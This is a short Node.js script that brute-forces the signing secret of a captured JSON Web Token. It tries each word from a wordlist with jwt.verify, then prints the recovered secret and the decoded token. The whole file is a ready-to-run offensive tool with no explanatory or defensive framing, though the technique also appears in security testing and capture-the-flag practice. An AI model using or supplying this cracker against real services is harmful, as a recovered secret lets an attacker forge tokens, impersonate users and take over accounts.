const jwt = require('jsonwebtoken');
const fs = require('fs');

const token = "PASTE_THE_CAPTURED_JWT_HERE";
const wordlist = fs.readFileSync('wordlist.txt', 'utf8').split('\n');

console.time('crack');
for (const word of wordlist) {
  try {
    const decoded = jwt.verify(token, word.trim());
    console.log(`SECRET FOUND: "${word.trim()}"`);
    console.log(decoded);
    console.timeEnd('crack');
    break;
  } catch (e) {}
}